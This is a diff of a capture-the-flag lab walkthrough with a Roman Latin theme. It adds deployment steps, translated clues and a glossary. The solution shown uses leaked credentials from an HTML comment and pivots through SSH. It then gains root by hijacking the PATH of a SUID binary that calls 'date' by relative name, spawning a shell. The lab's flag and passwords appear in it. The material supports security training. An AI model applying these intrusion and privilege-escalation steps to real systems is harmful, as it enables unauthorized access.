@@ -22,13 +22,30 @@ attacker ── guest 172.20.0.0/24 ── castra(pivot) ── internal 10.10.1
  172.20.0.5                        .10 / 10.10.10.5                            10.10.10.10
 ```
 
-The player plays from the **attacker** container:
+**Deploy:**
 
 ```bash
-docker compose exec attacker bash
+docker compose up -d --build                       # pivot + target (published)
+docker compose --profile attacker up -d --build    # + the in-lab attacker box
 ```
 
-All commands below are run from inside that container.
+**Entry.** This walkthrough is written from the **in-lab attacker box** (so the
+addresses match `test/solve.sh`):
+
+```bash
+ssh scout@<lab-host> -p 2222        # password: ambiorix
+# fallback: docker compose exec attacker bash
+```
+
+From your **own machine** instead, use the pivot's published host ports — swap
+`172.20.0.10` → `<lab-host>`, web `:80` → `:8080`, SSH → `-p 2022`.
+
+> **Note on language:** everything the player sees in-environment is in **Latin**
+> (web UI, login banners, deploy notes, muster roll, the SUID tool). English
+> translations of every clue are inline below and collected in the glossary at
+> the end. Credentials / IPs are literal ASCII.
+
+All commands below are run from inside the attacker box.
 
 ---
 
@@ -53,9 +70,13 @@ The login page ships a dev-reminder in an HTML comment:
 
 ```bash
 curl -s http://172.20.0.10/login | grep -i -- '-->'
-# <!-- TODO(centurion): disable the shared recruit login before we go live.
-#      creds still: tiro / AveLegioXIV-54 -->
+# <!-- mandatum centurionis: tesseram communem recrutorum dele antequam in
+#      proelium imus. etiamnunc valet: tiro / AveLegioXIV-54 -->
 ```
+
+> *Translation:* "centurion's order: delete the recruits' shared password before
+> we go to war. still works: **tiro / AveLegioXIV-54**." (`tessera` = the Roman
+> army's literal word for a watchword/password.)
 
 ### 1b. Log in and find the injection point
 
@@ -116,10 +137,17 @@ sshpass -p 'FrontierWatch-54BC' ssh -o StrictHostKeyChecking=no scout@172.20.0.1
 # (or just: ssh scout@172.20.0.10  and type the password)
 
 scout@castra:~$ cat ~/muster.txt
-#   camp login ....... eburo / ArduennaShadow
-#   ...a root-owned roll-call tool in /usr/local/bin on the camp box...
+#   Tabula militum — castra bellica interiora (arduenna, 10.10.10.10)
+#     aditus ad castra ... eburo / ArduennaShadow
+#     ...instrumentum ... a radice (root) possessum in /usr/local/bin ...
+#        Fons in /usr/local/src est ...
 scout@castra:~$ exit
 ```
+
+> *Translation:* "Muster roll — inner war-camp (arduenna, 10.10.10.10). camp
+> login: **eburo / ArduennaShadow**. …a **root-owned tool in `/usr/local/bin`**
+> …its source is in `/usr/local/src`." → inner creds + a strong nudge at the
+> SUID privesc.
 
 ### 2b. Open a SOCKS proxy through castra (SSH dynamic forward)
 
@@ -152,7 +180,8 @@ eburo@arduenna:~$ find / -perm -4000 -type f 2>/dev/null
 #   ... /usr/local/bin/castellum
 
 eburo@arduenna:~$ cat /usr/local/src/castellum.c      # source is readable
-#   system("date +\"...\"");   <-- SUID root calls `date` by RELATIVE name
+#   system("date +\"[castellum] recensio confirmata ...\"");
+#   <-- SUID root calls `date` by RELATIVE name
 ```
 
 `castellum` runs as root but calls `date` without an absolute path, inheriting
@@ -165,7 +194,7 @@ eburo@arduenna:~$ cd /tmp
 eburo@arduenna:/tmp$ printf '#!/bin/sh\n/bin/sh\n' > date   # or: cat /root/flag.txt
 eburo@arduenna:/tmp$ chmod +x date
 eburo@arduenna:/tmp$ PATH=/tmp:$PATH /usr/local/bin/castellum
-[castellum] verifying the watch rotation...
+[castellum] vices vigiliae probantur...      # "the watch rotation is checked..."
 # id -> uid=0(root)
 ```
 
@@ -183,8 +212,8 @@ flag{atuatuca_ambush_54bc}
 `test/solve.sh` runs this entire path non-interactively and asserts the flag:
 
 ```bash
-docker compose up -d --build
-./test/solve.sh          # prints "==== PASS ====" and the flag
+docker compose --profile attacker up -d --build   # solve.sh runs inside attacker
+./test/solve.sh                                    # prints "==== PASS ====" + flag
 ```
 
 ## Intended path vs. traps
@@ -194,5 +223,29 @@ docker compose up -d --build
   `castra` (enforced by the `internal: true` network).
 - **No guessing.** Every credential/host is discoverable (HTML comment →
   deploy notes → muster roll → readable SUID source). No brute force required.
+  The Latin is a translation layer, not an obstacle: creds are literal ASCII and
+  always in `nomen / tessera` form.
 - **Alternate-but-equivalent pivots** (sshuttle / chisel / manual `ip route`
   through `castra`) also work — they're the same beat, not unintended wins.
+
+## Latin glossary (clue → translation)
+
+| Latin | English |
+|---|---|
+| `tessera` | watchword / password (Roman army term) |
+| `mandatum centurionis` | the centurion's order |
+| `tesseram … dele antequam in proelium imus` | delete the password before we go to war |
+| `Ad stationem te confer` | report for duty |
+| `Castra intra` / `Tessera reiecta` | enter the camp / password rejected |
+| `Renuntiationem vigiliae defer` | file a watch report |
+| `Signum (in tabula imprimendum)` | sigil (to be stamped on the tablet) — the SSTI field |
+| `centurio hoc verbum in signo vetat` | the centurion forbids that word on a sigil (the `config` filter) |
+| `commentarii de dispositione` | deployment notes (`DEPLOY_NOTES.txt`) |
+| `aditus per SSH` | SSH access |
+| `castra interiora … adiri NON possunt … transiliendo per hanc machinam` | the inner camp can't be reached except by hopping through this box |
+| `Tabula militum` | muster roll (`muster.txt`) |
+| `aditus ad castra` | login for the camp |
+| `instrumentum … a radice (root) possessum … Fons in /usr/local/src` | a root-owned tool … source in `/usr/local/src` |
+| `vices vigiliae probantur` | the watch rotation is being checked (`castellum` output) |
+| `Ambiorix vigilat` | Ambiorix is watching (target MOTD) |
+| `signum` (the objective) | the flag |
